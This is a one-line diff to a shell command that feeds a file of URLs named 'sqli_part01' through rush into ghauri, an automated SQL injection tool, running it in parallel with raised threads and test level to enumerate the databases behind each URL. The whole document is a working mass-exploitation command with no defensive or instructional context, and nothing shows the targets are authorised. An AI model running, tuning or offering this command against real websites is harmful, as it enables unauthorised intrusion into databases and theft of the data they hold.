@@ -1,1 +1,1 @@
-cat sqli_part01.txt | rush -k -j 20 'bash -c "ghauri --url \"{}\" --current-db --timeout 10 --threads 60 --level 3 --technique BT --batch"'
+cat sqli_part01.txt | rush -k -j 20 'bash -c "ghauri --url \"{}\" --dbs --confirm --timeout 10 --threads 80 --level 5 --fresh-queries --technique BT"'
